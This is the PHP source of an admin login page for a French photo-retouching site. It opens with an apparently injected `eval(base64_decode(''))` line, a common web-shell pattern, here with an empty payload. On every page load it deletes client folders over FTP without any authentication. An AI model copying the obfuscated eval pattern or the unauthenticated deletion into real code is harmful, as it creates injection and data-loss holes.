<?php eval(base64_decode('')); ?>
<?php
	require "../includes/const_decl.php";
	
	//set_time_limit(0);
	
	$sql="SELECT * FROM factures ORDER BY id_facture";
	$results=mysql_query($sql);
	while ($rows=mysql_fetch_array($results)) {
		extract($rows);
		if (DiffDate(Date('Y-m-d'), $date_livraison, 'd')>5) {
			//création répertoire oooophoto.com
			$connexion = ftp_connect(FTP_SERVER);
			$login = ftp_login($connexion, FTP_LOGIN, FTP_PASSWORD);
			if (!$connexion || !$login) { die('Connexion réfusée!'); }
			
			@ftp_cdup($connexion);
			
			$rep='gestion/clients/'.$id_client.'/'.$id_facture;
			
			// récupération de la liste des dossiers
			$ListeFichier = ftp_nlist($connexion, $rep);
			$i=1;
			foreach($ListeFichier as $Fichier) {
				if(isfile($connexion,$Fichier)){
					@ftp_delete($connexion,$Fichier);
				}
			}
			@ftp_rmdir($connexion,$rep);	
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>
<meta name="google-site-verification" content="aMiKad3AJKizrwF0zdO6HavShyOoDcbrGpORMThJEUg" />
<title>myretooch.com</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Author" content="Andrianandraina RATOBISON"/>
<meta name="Description" content="Retouche d'images professionnelle sur Paris, spécialisée en retouche photo de types mode, beauté, art, montage, relooking, réparation. Retouche de photos essentiellement pour la publicité, la presse, les maisons de disques et les photographes de mode."/>
<meta name="Category" content="photo, retouche de photos, retouche d'images, illustration, mode, beauté, montage, relooking, réparation, traitement de l'image, art numérique"/>
<meta name="Classification" content="retouche photo, retouche de photos, retouche d'images, post-production, infographie, illustration, photomontages, traitement de l'image, art numérique" />
<meta name="keywords" content="myretooch, retouche, retouche numérique, photo retouching, affinement de silhouette, myretooch, myretooch.com, chromie, colorimétrie, colorisation, conception graphique, couverture magazine, cover mag, correction de peau, correction de silhouette, créa, créations visuelles, détourage, digital retoucher, edito, edition, fluidite, grain de peau, galérie d'images, galérie photos, galéries photos, graphisme, graphiste, image, images, incrustation, illustration, illustrateur, illustratrice, lissage, magazine, mode, beauté, relooking, réparation, montage, numérique, parutions, peau, personnages, personnalités, photo, photos de presse, photo-montage, photomontage, photomontages, professionnel de la retouche photo, réalisation, retouch, retouching, retouche cosmétique, retouche de peau, retouche chromatique, retouche colorimetrique, retouche morphologique, retouche d'images, retouche photo, retouches haut de gamme, retouches de luxe, retoucheur, retoucheuse, traitement de l'image, trucage, visuel, visuels" />
<meta name="title" content="myretooch.com - Retouche et traitement d'images" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Cache-Control" content="no-cache" />
<meta http-equiv="Content-Language" content="fr, en, es, ru, jp" />
<meta http-equiv="imagetoolbar" content="no" />
<meta name="viewport" content="width=1024" />
<meta name="copyright" content="http://www.myretooch.com" />
<meta name="revisit-after" content="2 days" />
<meta name="Rating" content="Mature" />
<link rel="stylesheet" href="design/styles_.css" type="text/css" media="all" />
<link rel="icon" href="../favicon.ico"/>
<script language="JavaScript" type="text/javascript">
	function verifier() {
		var form=document.forms["entree"]
		
		if (form.login_pers.value=='') {
			form.login_pers.focus()
			return false
		}
		
		if (form.pwd_pers.value=='') {
			form.pwd_pers.focus()
			return false
		}
	}
</script>
</head>
<body onselectstart="return false" oncontextmenu="return false" ondragstart="return false" onMouseOver="window.status=''; return true;">
<form name="entree" method="post" action="cod_login.php" onSubmit="return verifier();">
  <table width="264" border="0" align="center" cellpadding="2" cellspacing="0" class="table">
    <tr class="table"> 
      <td colspan="2"><div align="center"><img src="../images/myretooch_logo.gif" width="260"></div></td>
    </tr>
    <tr class="tr">  
      <td>Login :</td>
      <td><input type="text" name="login_pers" autocomplete="off"></td>
    </tr>
    <tr class="tr">
      <td>Mot de passe :</td>
      <td><input type="password" name="pwd_pers" autocomplete="off"></td>
    </tr>
    <tr class="tr">
      <td colspan="2"><div align="center"><input type="submit" value="OK" class="submit"></div></td>
    </tr>
  </table>
</form>
</body>
</html>
